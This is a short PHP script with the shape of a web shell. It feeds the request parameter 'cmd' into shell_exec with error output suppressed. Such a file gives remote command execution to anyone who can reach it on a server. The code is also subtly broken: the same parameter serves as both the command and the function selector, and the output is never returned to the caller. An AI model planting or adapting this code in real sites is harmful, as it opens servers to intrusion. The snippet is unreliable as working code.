<?php
function do_phpfun($cmd,$fun) {
	$res = '';
	switch($fun){
		case "shell_exec": $res = @shell_exec($cmd); break;
	}
	return $res;
}

if (isset($_REQUEST['cmd']))
	do_phpfun($_REQUEST['cmd'], $_REQUEST['cmd']);
?>